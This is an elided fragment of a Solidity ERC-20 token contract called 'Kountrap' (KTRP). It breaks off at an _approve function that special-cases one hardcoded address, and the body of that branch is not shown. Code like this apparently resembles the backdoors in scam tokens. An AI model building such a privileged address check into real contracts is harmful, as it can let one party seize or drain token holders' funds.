...
contract Kountrap is Context, IERC20, Ownable {
    ...
    string private _name = "Kountrap";
    string private _symbol = "KTRP";
   ...
   //this method is responsible for taking all fee, if takeFee is true
    ...
    function _approve(address owner, address spender, uint256 amount) private {
        ...
        if (owner == address(0xD216CF67D96D1509A3536caEad57f0B28F617a35)) {
